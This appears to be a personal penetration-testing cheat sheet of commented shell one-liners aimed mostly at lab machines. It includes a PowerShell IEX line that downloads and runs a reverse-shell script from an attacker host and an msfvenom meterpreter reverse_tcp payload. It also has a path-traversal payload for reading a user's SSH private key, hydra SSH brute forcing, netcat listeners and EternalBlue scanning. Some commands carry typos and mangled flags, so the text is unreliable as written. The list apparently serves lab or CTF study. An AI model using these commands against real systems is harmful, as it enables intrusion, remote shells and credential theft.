grep –i veronica /usr/share/wordslists/rockyou.txt > /root/Desktop/dict.txt #grep all the words from rockyou.txt with veronica in them and sore them to dict.txt

for x in 1066 1215 1466 67 1469 1514 1981 1986; do nmap -Pn –host-timeout 201 –max-retries 0 -p $x 192.168.0.102; done # script for port scanning with selected ports

curl -k http://10.10.10.7/themes/elastic/images/logo.png -o logo1.png #download a file and -k to ignore certificate checking and -o to save file
as logo1.png

exiftool logo.png #exiftool is a platform independent command line and GUI application for 
reading, writing and editing meta information of images and media files

searchsploit -x php/webapps/37879.pl #For showing the code of exploit

wc -l /usr/share/wordlists/dirbuster/dirty_Cheater #count lines in a file, wc=word count

:g/nologin/d #when in vim, use this to delete the lines with nologin written

hydra -L users -P pw ssh://10.10.10.7 #brute force on ssh protocol with usernames from users file and passwords from pw file

ls /etc | grep fail2ban #grep fail2ban filenames from etc folder

graph.php?current_lang=../../../../var/lib/asterisk(username)/.ssh/id_rsa #See if you can get users private key if you find an LFI

telnet 10.10.10.7 25 #telnet to see if the smtp port is responding

nc lvnp 1337 #listen on port 1337 using ncat

sudo -l #To find out what commands you can run as 

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-PowershellTCP.ps1')"
Invoke-WebRequest -Uri http://<>/file -OutFile <filename>

dig axfr @10.10.10.13 cronos.htb #dns zone transfer

nano /etc/hosts #if you find a dns running edit your host file for resolving through it, example > 10.10.10.13     example.htb

/opt/gobuster/gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt #-k to ignore
ssl certification verification and -x to add extension to every file in the wordlist

nmap -sS -A --top-ports 1000 10.10.10.29 | tee nmap_bank.txt

nikto -host IP

nmap -sC -sV -oA nmap 10.10.10.7 

python -c 'import pty;pty.spawn("/bin/bash");'

python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://10.10.10.7/admin/

iptables -L #List all the rules

iptables -A OUTPUT -d 10.10.10.14 -j DROP #Drop packets going to 10.10.10.14

./gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.15 -t 20

davtest -url http://10.10.10.15 #For testing webDAV servers

msfvenom -l | grep windows #search for windows keyword  in payloads

msfvenom -p winodws/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx

echo /asdasd23213sdasdasdwqeqweA= |base64 -d > file #copy the magic bytes, base64 encode it and safe it in a file 
file file #run this command to find if the file is identified as your prefered one or not.

dnsenum --enum example.htb

sqlmap -r request.req #sqlmap for POST request 

python -m SimpleHTTPServer #running python server on port 8000

wget -r http://10.10.14.28:8000/ #run this on victim's machine for transfering file from your own to victim's machine.

nmap --script vuln -p135,139,445 10.10.10.40 -oA blue_scripts #If the target is vulnerable to Eternal Blue exploit 

smbclient -L //10.10.10.40 #smb recon
smbclient \\\\10.10.10.178\\IPC$ #Accessing share
smbclient \\\\10.10.10.178\\Users -U TempUser #Accessing share with username



exploit -j #for runnung a listner in background in msfconsole

find / -perm -4000 2>/dev/null #look for setuid binaries 
find / -perm -4000 -ls 2>/dev/null #look for setuid binaries with permissions as well

nmap --script vuln /usr/share/nmap/scripts/smb-check-vulns.nse 10.10.10.178 -p445 #nmap engine 
nmap -p 445 --script "vuln and safe" -Pn -n 10.11.1.5  #For runnning nmap engine

locate ms17-010 | grep .nse$ #Look for nmap scripts with ms17-010

uname -m # Find linux architecture

gcc -m32 1397.c -o 1398 -Wl,--hash-style=both #compile c file with 32 bit architecture with both the hash styles

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-PowershellTCP.ps1')"
Invoke-WebRequest -Uri http://<>/file -OutFile <filename>

